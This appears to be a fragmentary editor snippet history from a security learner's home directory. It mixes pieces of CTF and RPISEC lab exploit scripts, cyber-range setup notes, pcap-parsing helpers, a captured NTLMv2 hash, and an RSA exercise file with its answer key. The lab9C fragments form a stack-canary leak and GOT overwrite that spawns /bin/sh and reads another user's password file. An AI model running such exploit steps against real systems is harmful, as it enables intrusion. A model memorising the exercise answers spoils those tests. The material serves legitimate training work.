9f52bda62b6cbaab14de65ee957c8b4a|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|30|1|V|python
	session = int(input('Enter session number:'))
	payload += p32(session)
3c0326aa807b7ae7be24c6cd751927d5|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|36|41|v|python
	 number:
c70f13ff82f28d85d21dee67dd78dba6|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|36|1|V|python
	offset = int(input('Enter packet offset:'))
	payload += p32(offset)
006292ef39ab58ca7430f523c7e1d376|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|39|23|v|python
	packet offset
b1fe4563c55f50f838370b0300a16468|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|39|1|V|python
	fd = int(input('Enter fd:'))
	payload += p32(fd)
922d962964b9659c7790477f631116d8|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|43|1|V|python
	payload += p32(fd_len)
369eba4d6f420fa73b31a3d5f70f4b3d|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|46|16|v|python
	fd_len
b82c662f54f06a6f14ade0bb4f90a667|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|3|9|V|python
	r = remote('spiderlabsctf.com', 8789)
	
bb4c6ab88daa5436858ca269dbf9b452|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|91|1|V|python
	        b'/session/'
6844acdce7e192c21c184914d73ab6be|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|76|19|v|python
	proc
623dac1de84e33843f8880d88cdaa595|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|76|18|v|python
	//self/exe
6d41360e049b7ba13bc096e94786be12|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|146|5|V|python
	    else:
	        print('Got {:#x} packet'.format(packet_type))
ad08aa58c8b4634f4c04cd25a38a1da9|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|145|1|V|python
	    print('Offset: ', offset)
3475fa85da9c72c94bdbdf952d839dd4|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|146|1|V|python
	    print('Fd:', fd)
	    print('Fd defined length:', fd_defined_length)
	    print('Length: ', length)
f607437fed44e020ec8d52b7c652cd28|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|75|1|V|python
	def send_read():
	    filename = b'/session/123'
	    read_packet = (
	        p32(0) + #offset
	        p32(23) + #fd
	        p32(100) + #fd defined length
	        p32(len(filename)) + #length
	        filename + #path
	        b''
	    )
	
	    payload = (
	        p32(0x50494843) +
	        p32(types['READ']) +
	        p32(123) + #session
	        p64(1) + #callback
	        read_packet.ljust(DATA_MAX_SIZE, b'\x00')+
	        b''
	    )
	
	    print('Payload:', payload)
	
	    return payload
553ccc9779a9ae25d264c09a611b1eb6|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|95|1|V|python
	    print('Payload:', payload)
0b809182506e2c50a0da1ae31f0334e3|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|97|5|v|python
	send_read
f4da9b944aa7096c02e560e7424530f4|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|98|16|v|python
	b'/session/123'
f6b8288be9c678b66ac2f5f7509d1548|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|113|1|V|python
	        read_packet.ljust(DATA_MAX_SIZE, b'\x00')+
9308989c9adbddef0c20a1d4b36752f2|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|133|9|V|python
	        read_packet
1f1e4d113e8d4435b74e853f1d1b1370|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|176|8|v|python
	send_run('/sessions/123')
2d7b5469e957d0c98e7ceb136134d5c1|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|161|18|v|python
	b'\x00\x00\x00\x00':
32cd14192aa04137a2fc613462e1e529|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|119|1|V|python
	def send_auth():
	    read_packet = (
	        p32(0) +
	        p32(0) +
	        p32(0) +
	        p32(0)
	    )
	
	    payload = (
	        p32(0x50494843) +
	        p32(types['AUTH']) +
	        p32(0) +
	        p64(0) +
	        read_packet.ljust(DATA_MAX_SIZE, b'\x00')+
	        b'a' * 16
	    )
	
	    return payload 
7b7894df6b20d6f072b224c6e2c32037|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|150|29|V|python
	        # r.send(send_auth())
	        # process_response(r.recv(DATA_MAX_SIZE))
c7f34f44b1f354e5a57413d11daf96c3|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|175|1|V|python
	r.send(send_auth('admin:admin'))
33b39096c0e1d7055ceebd1b7796df2a|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|176|13|v|python
	auth('admin:admin'))
b43434d828efed5d78fd7590e970dc91|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|177|1|V|python
	r.send(send_hello())
	process_response(r.recv(DATA_MAX_SIZE))
1fedf97f8f09579045d16c337c7e9ee8|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|148|1|V|python
	    if packet_type == types['AUTH']:
4a0d164772a0b9b97e41de6933bd77d3|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|150|5|V|python
	        r.send(send_hello())
	        process_response(r.recv(DATA_MAX_SIZE))
4980c3598285cb096c84dcb68e73a981|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|170|36|V|python
	    if packet_type == types['AUTH']:
	        r.send(send_auth('admin:admin'))
	        process_response(r.recv(DATA_MAX_SIZE))
39c768f0e9ed98199e485fcaa0e8c9e9|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|174|1|V|python
	r.send(send_hello())
20ce4747791d793995698e47e20b73f7|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|76|25|v|python
	endode
75d9c265bb50d87583291b5d6e8ff233|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|83|9|V|python
	        b''
ba30c6e9a51645a8495dc6c68901142f|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|133|9|V|python
	        b'a' * 16
af455b671ba4719c93d93e28fc8431dc|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|172|19|v|python
	/etc/dsafdadsfasdfa
cd5c03a98fa73f7a5df547c4a041fc49|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|173|1|V|python
	process_response(r.recv(DATA_MAX_SIZE))
ced923c240da4ad68bfcdeaa6f91fefb|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|172|18|v|python
	'/etc/asd'
eb61eead90e3b899c6bcbe27ac581660|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|65|20|v|python
	HELLO
d740e537c769ee174e1dde0a1d64d64d|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|65|20|v|python
	AUTH_SUCCESS
aa12cd7d4152831e533519a54f2dcfdc|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|172|18|v|python
	'/session/123.log'
76a2173be6393254e72ffa4d6df1030a|file:///home/neo/CTFs/spiderlabsctf2020/talk/solve.py|172|24|v|python
	passwd
d4825de873bccad7f3c72cbf31ccedbd|file:///home/neo/CTFs/spiderlabsctf2020/talk/send.py|56|5|V|python
	    print(len(recved[4:8]))
a06de5d75bd2b9bc48f4a9edb0f3fdbe|file:///home/neo/CTFs/spiderlabsctf2020/talk/send.py|77|1|V|python
	#     for i in range(20):
	#         data = b'A' * i
	#         log.success('Size: {:d}'.format(i))
	#         log.info(send_packet(type, data))
039b56a692cd66eefeea44a17539e5a2|file:///home/neo/CTFs/spiderlabsctf2020/talk/send.py|49|19|v|python
	0xffffffff
cb5597e02992b9699e2e45e5b15e2c53|file:///home/neo/cplusplus/chapter12/Virtual.cpp|1|1|V|cpp
	
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
	20
	21
	22
	23
85899fdd9f21998e227c6b7972c278b7|file:///home/neo/cplusplus/testing/vuln.cpp|47|5|V|cpp
	    fgets(name, 100, stdin);
d33f6052e5ae0d0183c1b675c7760751|file:///home/neo/cplusplus/testing/vuln.cpp|33|31|v|cpp
	 >> buf
b08dbc0862d4400db813cbf72944d3f2|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|2|1|V|python
	import time
	import string
	from multiprocessing.dummy import Pool as ThreadPool
82907f1667662ecf9635f8539d580ef5|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|2|1|V|python
	PASS_LEN = 12
2eb14e9917d48ac97449830929442561|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|12|28|V|python
	host = args.HOST or '127.0.0.1'
	port = int(args.PORT or 2522)
e6e2ac840adb351c8d224296bec48cd3|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|20|1|V|python
	def remote(argv=[], *a, **kw):
	    '''Connect to the process on the remote host'''
	    io = connect(host, port)
	    return io
084e0343a0486ff05530df6c705c8bb4|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|17|57|v|python
	guest
dad825048df859686283b3187fd5f8bd|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|22|19|V|python
	    if args.REMOTE:
	        return remote(argv, *a, **kw)
b55b9998647e56112809f9f1cc8c4cec|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|48|1|V|python
	# We can only overwrite the first passcode (last 4 bytes of name), but we dont have control over the second one, so we have to find another way to get the flag
	# Since the user reads our input as an address, we can use the last 4 bytes as an arbitrary write and overwrite a got entry.
	# We find the instruction where system is called and overwrite the printf got entry with that address.
	WIN_ADDR = exe.sym.login + 127
	log_addr("System call", WIN_ADDR)
	PRINTF_GOT = exe.got.printf
	log_addr("Printf@got", PRINTF_GOT)
	OFFSET = 96
	io.recvuntil(': ')
	io.sendline(b'a' * OFFSET + p32(PRINTF_GOT))
	io.sendlineafter(': ', str(WIN_ADDR))
	
2aae4c5127404baabc35068259a45109|file:///home/neo/cyberranges/work/documentation/docker-compose/mount-file.md|1|1|V|vimwiki
	### Add file in docker composed machine using CyberRanges Producer
	
	1. Upload the file you want to add by clicking the **Add service** button in the Assets Tree. ![](./add-asset.png)
	2. In the drop-down menu, choose **Plain File** and upload the file by clicking the plus sign button on the bottom right corner. When the file is uploaded, click **Save Upload**. ![](./add-resource.png)
	3. Use the **Resource editor** to edit the *docker-compose.yml* file. Under the desired service, add the uploaded file in the following format: 
	`volumes:`
	`- "file_path_on_vm:file_path_on_docker_image"`
	Make sure that the indentation is correct, as seen in the image below.
ca47e36f40049d45b825488e1a911335|file:///home/neo/cyberranges/work/documentation/docker-compose/publish-port.md|1|1|V|vimwiki
	### Publish port in docker image, so that users can start a bind shell
	
	1. Open **docker-compose.yml** in the **Resource Editor**.
	2. Add the port you want to publish under the `ports:` option, in the format `host_port:container_port`, as seen in the screenshot below.
89932067d72222ab0fd67938ea8172dd|file:///home/neo/cyberranges/work/documentation/upgrade-rancher.md|1|5|v|vimwiki
	Upgrade the RancerOs flavor for cloud templates created by the producer
f3641529264d51fbd7d23767e57153eb|file:///home/neo/cyberranges/work/documentation/upgrade-rancher.md|1|1|V|vimwiki
	### Upgrade the RancerOs flavor for cloud templates created by the producer
	Some docker images created by the producer require more than the 1GB ram provided by default (e.g. scenarios running JRE). To upgrade the RancerOs flavor do the following steps:
	1. Create the cloud template in the producer ('+' button)
	2. In the scenario composer, change the flavor of the docker host
	3. Terminate the cloud template instance in the scenario composer
	4. Start the cloud template instance again
	5. Refresh the producer page
	6. Start the services in the producer
e7e25f8b20c9f8947956a67718f058e5|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|46|19|v|python
	0xffffcb4c
f824795f6b68ec04462c7ddd45f30d17|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|55|14|v|python
	io.recvline().strip()
311ebae05a2abfadac8487487e157772|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|47|30|v|python
	0xffffcf4c
d7640ed157b1bd7f9d195a8a21558255|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|46|32|v|python
	0xffffcf5c
50b25d723418de32b10c0b04a363a2de|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|51|1|V|python
	io.recvuntil(': ')
	io.sendline('2')
3467eaf11d7008f984777146f7458751|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|59|13|V|python
	io.recvuntil(': ')
	io.sendline('3')
40e1e19a159a775896503cdaca155ff7|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|51|1|V|python
	io.recvuntil(': ')
	io.sendline('2')
	io.recvuntil(':')
d8f825b3a4854c928ade21aefb1e055b|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|53|1|V|python
	io.recvuntil(': ')
	io.sendline('2')
	io.recvuntil(':')
	io.sendline(str(CANARY_OFFSET))
	io.recvuntil('= ')
	canary = int(io.recvline().strip())
	log.info("Canary value: %#x", canary)
b4793d04a37462733622722288042af6|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|64|17|v|python
	CANARY_OFFSET
3a93f00bc8f18075742868d88ee1b2c2|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|67|11|v|python
	Canary value: %#x
a6ec7d6091cfdbf8067321d0f5a3087d|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|67|1|V|python
	log.info("Main return addre", canary)
b620dd5667c9324b9d72d9711238ef6f|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|67|18|v|python
	MAIN_RET_OFFSET
1a93b59c9a4c9da9b85259447e678c76|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|66|1|v|python
	canary
c16cf7413e3b889302d373bd053a67db|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|67|1|V|python
	log_addr("Main", main_ret)
48e08c2dadc79e02dcb10035e5edd3d5|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|69|23|v|python
	main_ret
e5fa88d02cd2c535ac77f36ad30beb5d|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|68|51|v|python
	.address
f54d700a8e8d4bece8c9fc96eb6733c6|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|50|1|V|python
	log.info("Main offset %d", MAIN_RET_OFFSET)
caafde0060b6341c8d5124e168e09bf3|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|69|1|V|python
	print(main_ret)
d051c11d5ab266364a8e78fdabf817de|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|71|1|V|python
	log_addr("Main ret", main_ret)
897d720e7d30864a5061366173c48dfe|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|77|41|V|python
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("system@libc: %#x" % SYSTEM_ADDR)
6c861e8e117ca3cd9356ab2957425280|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|80|1|V|python
	    io.recvuntil(': ')
	    io.sendline('1')
	    io.recvuntil(':')
13ef613e29806f44781be32d01c8a130|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|80|1|V|python
	    io.recvuntil(': ')
	    io.sendline('1')
5cf28b296df5392513275688d43446a0|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|80|1|V|python
	    io.recvuntil(': ')
b39966ccb8cde400183f9f70cc48b221|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|29|24|v|python
	0x00000f96
744904f1f53ce0a912ee3beb7d8bbfe3|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|70|1|V|python
	if main_ret < 0:
	    main_ret = 0xffffffff + main_ret
05d583eeaeb087ee575d061a1724e30b|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|88|1|V|python
	io.recvuntil(': ')
	io.sendline('1')
	io.recvuntil(':')
	io.sendline(p32(SYSTEM_ADDR))
b1cf1317a7ae8e9f1f6a0723aecb1ddb|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|83|1|V|python
	    io.recvuntil(': ')
	    io.sendline('1')
	    io.recvuntil(':')
	    io.sendline('10')
cb2bb5469dc8da7a6e8ae3809ec3ff8a|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|81|29|v|python
	  return address
487b9a2948bf301fa5cc031063d76f68|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|62|16|V|python
	# if canary < 0:
	#     canary = 0xffffffff + canary
ea6de14919b1d68cee708de0e8795d63|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|99|1|V|python
	io.recvuntil(': ')
	io.sendline('1')
	io.recvuntil(':')
	io.sendline(str(SYSTEM_ADDR))
0216e05c747427edae6019d7371db622|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|78|1|V|python
	log_addr("System", SYSTEM_ADDR)
a45da96d0bf6575970f2d27af22be28a|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|80|11|v|python
	System
efe4937652c00f38ceaee8b5f485b4e6|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|17|23|v|python
	pwnable
f2824dac7a509b92862ec041f0bb34cd|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|7|1|V|python
	bin_name = './lab9C'
e0c1d12ac12119150b8fe8538008d628|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|9|1|V|python
	exe = context.binary = ELF(bin_name)
91d23fa7326c8243bea86e6141be176b|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|109|13|v|python
	str(SYSTEM_ADDR)
1a2844e8c91863a84139d346f2b5c335|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|105|1|V|python
	
	io.recvuntil(': ')
	io.sendline('1')
	io.recvuntil(':')
	io.sendline("AAAA")
527e7a3da73965c6fe1009a9587d389a|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|9|6|v|python
	 context.binary = ELF(bin_name)
3f73d082c94ef9adc00bbee07409f49c|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|8|1|V|python
	bin_name = '/levels/lab09/lab9C'
39813a0c9e38d6cf6a1197749570020d|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|109|13|v|python
	(SYSTEM_ADDR
b5c5ba72c8844c646f85ed75768df55c|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|59|1|V|python
	io.recvuntil(': ')
	io.sendline('2')
	io.recvuntil(':')
	io.sendline(str(CANARY_OFFSET))
	io.recvuntil('= ')
	canary = int(io.recvline().strip())
862d44134a2f681c3513ea5b3db16abc|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|65|19|V|python
	io.recvuntil(': ')
	io.sendline('2')
	io.recvuntil(':')
	io.sendline(str(CANARY_OFFSET))
	io.recvuntil('= ')
4a4f830d9ad3207602c7edecdf54a43b|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|70|10|v|python
	int(io.recvline().strip())
9d35868d63310a90f5376ac109426963|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|68|19|V|python
	io.recvuntil(': ')
	io.sendline('2')
	io.recvuntil(':')
	io.sendline(str(MAIN_RET_OFFSET))
	io.recvuntil('= ')
3172811e0cc53bf87089ebf91188e421|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|72|1|V|python
	log_addr("Main ret", main_ret_log)
a579f7b4166744f0a6d9757411120825|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|70|1|V|python
	if main_ret < 0:
	    main_ret_log = 0xffffffff + main_ret
45c009e4fe9d0741a7b87ade8bbd381e|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|69|1|V|python
	main_ret_log = main_ret
c4ca3309d0b885caccde5ed1393a3687|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|89|1|V|python
	io.recvuntil(': ')
	io.sendline('1')
	io.recvuntil(':')
	io.sendline(str(canary))
678cd63f0bcb0479851ec014c71e8464|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|95|1|V|python
	io.recvuntil(': ')
	io.sendline('1')
	io.recvuntil(':')
	io.sendline('1234')
ec7d27c458afb6380f60d1a200f173af|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|98|1|V|python
	io.recvuntil(': ')
	io.sendline('1')
	io.recvuntil(':')
f5852562a92370d2fb9a5afc6e1596fc|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|99|1|V|python
	io.sendline(str(BINSH_ADDR))
3c77623105c662e8f8418304338f6663|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|6|1|V|python
	# Set up pwntools for the correct architecture
fe81a2843e643163f3ee342bf5ccc512|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|63|1|V|python
	libc = ELF('./libc/libc.so.6')
17b1be2e4c0a658ebb60ac765a9ad0bd|file:///home/neo/cyberranges/wireshark-scenario/hash.txt|1|1|v|text
	Hacker 
73c0fbf11f7f3bfe27e386447ea6f27f|file:///home/neo/cyberranges/wireshark-scenario/hash.txt|4|1|V|text
	7392dbec555d1d1a
18caca315ecccd069f40433722d33e71|file:///home/neo/cyberranges/wireshark-scenario/hash.txt|3|1|V|text
	c3fdd269916984d5bc7e6b9685a856d6 
3a18994dfa909666be304b10066c2933|file:///home/neo/cyberranges/wireshark-scenario/hash.txt|1|40|v|text
	c3fdd269916984d5bc7e6b9685a856d6
f5e667f028daa5a9924cff70fdf83273|file:///home/neo/cyberranges/wireshark-scenario/hash.txt|1|1|V|text
	Administrator::Hacker:7392dbec555d1d1a:c3fdd269916984d5bc7e6b9685a856d6:0101000000000000ee9a810334e3d401b52834da8b5a13710000000002000c004800410043004b004500520001000a00570049004e0031003000040014006800610063006b00650072002e006c006100620003002000770069006e00310030002e006800610063006b00650072002e006c0061006200050014006800610063006b00650072002e006c006100620007000800ee9a810334e3d401060004000200000008003000300000000000000001000000002000003cb7a4ac1f3b61b408b56db2bd95d630f64df0251f6324ec6924be0f0d6d7d110a0010000000000000000000000000000000000009002600520050004300530053002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000
7bb8b7b43d2e4f636d95b1dba430b4c5|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|4|1|V|python
	pcap = rdpcap("http.pcapng")
	pcap = defragment(pcap)
fed081ca703c874618189f1da127ab35|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|4|1|V|python
	pcap = rdpcap("http.pcapng")
	pcap = defragment(pcap)
	packets = [p for p in pcap if Raw in p]
e13368cd51e4a658af436b0f74916405|file:///home/neo/cyberranges/wireshark-scenario/clear.py|4|1|V|python
	pcap = defragment(pcap)
18d9d2f926682a0a0c80dcafdf7e5cb1|file:///home/neo/cyberranges/wireshark-scenario/clear.py|3|27|v|python
	http.pcapng
0cdb6ec85b07153fb8dee2df6d80127f|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/clear.py|1|1|V|python
	from scapy.all import *
	
	pcap = defragment(rdpcap("cl3ar_keys.pcap"))
	packets = PacketList([p for p in pcap if Raw in p])
	
	for p in packets:
	    print(p['TCP'].payload)
a19ad5de522d78d4d08482c83339805a|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/clear.py|3|8|v|python
	defragment
72a896250c65c26c45d5a927b62bd31b|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/clear.py|4|38|v|python
	 if Raw in p
93258b0650114aae94c909ca211b36e5|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/clear.py|1|1|V|python
	from scapy.all import *
	
	pcap = rdpcap("cl3ar_keys.pcap")
	packets = PacketList([p for p in pcap if Raw in p])
	
	for p in packets:
	    print(p['TCP'].payload)
62cb85cf590283aec87e850d94fb6e37|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/clear.py|3|16|v|python
	cl3ar_keys
ce9f20ca1156a0b9a707135a54c6f013|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/urgent.py|7|2|V|python
	    print(p['TCP'].payload)
a9f83494135389ab7c6206c6dc7c82b5|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/urgent.py|9|14|v|python
	p['TCP'].urgptr
8cff310671a54c211e456fb61a4486d1|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/urgent.py|1|1|V|python
	from scapy.all import *
	
	pcap = rdpcap("urg3nt_c4ll.pcap")
	packets = PacketList([p for p in pcap])
	
	flag = ''
	for p in packets:
	    urgent_pointer = p['TCP'].urgptr
	    if urgent_pointer != 0:
	        flag += chr(urgent_pointer)
	print(flag)
fd2c74cff59cc032ecf978c68d9acb09|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/flag|1|1|^v|
	I07030000000000000003000000000000002a007f0004009f0000000000000023cb240000000807030000000000000003000000000000002a007f0004009f0000000000000023cb2400000008291000000000000000000000470c7b4201000000140000002400000005a29a59000000000000000000000000000000000404100000000100000000000000ffffffff0000000001010000000000000047079e0cffffffff1400000031303030303030303030312e30303030303030300100012200000000000000000000000023cb240000000000ffffffffffffffff0100000023cb2400feffffffffffffff010000000000000000000000010000008
b31129f5b842b7da86ed17d1dba365c0|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|80|1|V|python
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
b733190cddda095f318ca98afd5fbc68|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|82|1|V|python
	 0x2670d
16eae822aaea22e357e1068cf7467c25|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|82|22|v|python
	0x146fa1
4e9476c87fe545730a7be7e717631fcd|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|84|1|V|python
	BINSH_ADDR = LIBC_BASE + next(libc.search(b'/bin/sh\x00')) 
02b0638bc5102cb8a8190c0b50e1adfc|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|85|24|v|python
	+ next(libc.search(b'/bin/sh\x00')) 
ad1072e52058f9dbef255931eacc1966|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|82|1|V|python
	addr_binsh  = leak + 
4eec67c6a7b26c0426e7a829fee87f02|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|85|1|V|python
	log_addr("/bin/sh", 0xffffffff + BINSH_ADDR)
399b48d1874b1b907a5c4ca78f6e3858|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|83|11|v|python
	/bin/sh
9d8c4eaf9411d9e14d3112cad5e0085a|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|83|20|v|python
	0xffffffff + 
99efa63d16df8ff2e4d22482b9880b5e|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|77|1|V|python
	LIBC_BASE = main_ret - (libc.sym.__libc_start_main+249)
c023c7a1c7fecf6ac743f1246f4bb2f3|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|85|1|V|python
	# BINSH_ADDR = LIBC_BASE + 0x146fa1
564ad4456de4ab804023e5014761aab8|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|82|1|V|python
	# SYSTEM_ADDR = LIBC_BASE + 0x2670d
77ff91f9e78909c15221ee698551d8ad|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|63|1|V|python
	libc = ELF('./libc.so.6')
0d7363894acdee742caf7fe4e97c4d49|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|18|40|v|python
	2522
adcf82634b7133fdbf174b2e5ff26a85|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|112|1|V|python
	io.recvuntil('$ ')
	io.sendline('cat /home/lab9A/.pass')
	
	print(io.recvline())
64053d67ad112d26263c33ce51622902|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|73|1|V|python
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
652b106671c18c625763eb313e61665b|file:///home/neo/warzone-rpisec/lab09/9C/exploit.py|2|21|V|python
	#!/usr/bin/env python
	# -*- coding: utf-8 -*-
2d5a56438900213dd27f4883b799198a|file:///home/neo/cyberranges/work/rsa/rsa101.md|1|1|V|vimwiki
	#Story
90a5e76bd48d1233e65dda70cfbbea4d|file:///home/neo/cyberranges/work/rsa/rsa102.md|145|1|V|vimwiki
	1.
	What is the value of n?
	p = 649070741783334836781039490687
	q = 1070486289218994132971693754401
	
	Answer: 694821329812262035804291200549492757509584456961095904763487
	
	2.
	What is the value of p?
	
	q = 1110095749307584945672171028033
	n = 1208643221080406606293863005883065400169249609315696008151991
	
	Answer: 1088773848412886915109252084727
	
	3.
	What is the value of phi(n)?
	
	p = 855035130719865971137792166419
	q = 1109763312415091194747456956377
	
	Answer: 948886618898948958287529844853676861963601917511253558181168
	
	4.
	What is the value of the private key `d`?
	
	phi = 668162031825846272314815255387217637798126231020105643461536
	e = 65537
	Answer = 534105505642498657461106574900064964965870225837027853726337
	
	5.
	Write the number representation of the following text: enc0d3_th1s
	(**Hint:** you can use the `bytes_to_long` function from the PyCryptodome Python library)
	
	Answer: 122622797808825001423942003
	
	6.
	What is the plaintext? 
	**Hint:** for all the questions in this scenario requiring you to decrypt a ciphertext, you need to transform the decrypted plaintext from an integer back to bytes. Also, you need to provide the answer as a string, not as bytes.
	
	p = 635670668607987161937611322431
	q = 1195909404970947710757136949579
	e = 65537
	Ciphertext = 363206791642753465756967128583357481804690378573020185227804
	
	Answer: e4sy_st4rt
	
	7.
	What is the plaintext?
	
	p = 771064098414219086038491578659
	n = 916169398124173510869300400847142312764599353004968162819683
	e = 65537
	Ciphertext = 391504575204149913871255044465456934511576443147214672076516
	Answer: m0dulus_f4ct0rs
	
	8.
	What is the value of p?
	(**Hint:** think about the relationship between phi, p and q)
	
	q = 1114313482353782730429633906239
	phi = 795509140647040447053519524402193426375506123650679179934644
	
	Answer: 713900669106752061249304875239
	
	9.
	Encrypt the message 'encrypt_this' (without the quotes) given the following:
	
	p = 936391305578598439585838499659
	q = 1144686613930456575556154952209
	e = 65537
	
	Give your answer as a number:
	
	Answer: 863765022792016333359548324563419174109824935697598748019896
	
	10.
	What is the plaintext?
	
